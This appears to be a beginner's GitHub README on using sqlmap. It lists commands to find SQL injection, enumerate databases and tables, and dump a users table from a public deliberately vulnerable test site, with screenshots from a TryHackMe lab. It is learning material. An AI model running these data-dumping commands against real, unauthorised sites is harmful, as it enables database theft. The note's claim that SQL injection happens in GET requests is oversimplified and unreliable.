### Sqlmap 
- Sqlmap is the automated tool designed to identify and exploit SQL vulnerabilities in web application.
- This is a command line tool.
- Steps for using Sqlmap are as follows
  1. Use command : sqlmap -u <target website>
  2. Sqlmap then sends every type of SQL injection payload
  3. If the target is vulnerable to any one type of SQL injection we can retrive data in form of table from that web application.

---
I have listed some important commands from Sqlmap are listed below.

---

| # | Command | Purpose |
|---|---------|---------|
| 1 | `sqlmap -u "URL"` | Check if vulnerable |
| 2 | `sqlmap -u "URL" --dbs` | List all databases |
| 3 | `sqlmap -u "URL" -D database --tables` | List tables from a database |
| 4 | `sqlmap -u "URL" -D database -T table --columns` | List columns from a table |
| 5 | `sqlmap -u "URL" -D database -T table --dump` | Extract all data |
| 6 | `sqlmap -u "URL" --batch` | Auto-pilot mode (no prompts) |
| 7 | `sqlmap -u "URL" --banner` | Get database version |

---

- Sql injection happen in GET request so if web application contains GET request there may be high chances of SQL injection vulnerability.
- I have added simple steps below regarding Sqlmap tool see below


---


# Step 1: Check if vulnerable
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"

# Step 2: List all databases
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs

# Step 3: List tables from a database
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables

# Step 4: Dump data from users table
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump

---

## I have also added screenshots from tryhackme lab which i performed myself in controlled lab enviroment :

---

1. i retrived GET request

<img width="1432" height="701" alt="Screenshot 2026-05-17 163142" src="https://github.com/user-attachments/assets/1e91832d-bfd0-4e93-b0b3-ce4f4be25fc4" />

---

2. List all databases

<img width="1774" height="731" alt="Screenshot 2026-05-17 163718" src="https://github.com/user-attachments/assets/c8f6c7d2-3e99-4512-8631-956562e4fa4e" />


<img width="541" height="284" alt="Screenshot 2026-05-17 164850" src="https://github.com/user-attachments/assets/4fe74200-38df-41c9-ba65-1325442b3929" />


---


3. List tables from database


<img width="1268" height="77" alt="Screenshot 2026-05-17 165605" src="https://github.com/user-attachments/assets/12050313-aed2-41ef-be7d-f653b9373b02" />


<img width="828" height="169" alt="Screenshot 2026-05-17 165841" src="https://github.com/user-attachments/assets/e6ba8db9-9b21-4691-8f77-b64b375387b2" />


----


4. Dump the data from User tabel


<img width="1288" height="408" alt="Screenshot 2026-05-17 172243" src="https://github.com/user-attachments/assets/a9b5416a-7702-4ec1-983e-c3569100d906" />



---



### Here by doing this repo i learned 
1. What is SQL injection
2. What is Sqlmap
3. How to  use Sqlmap
4. How to retrive data using Sqlmap


---

### Thank you











 
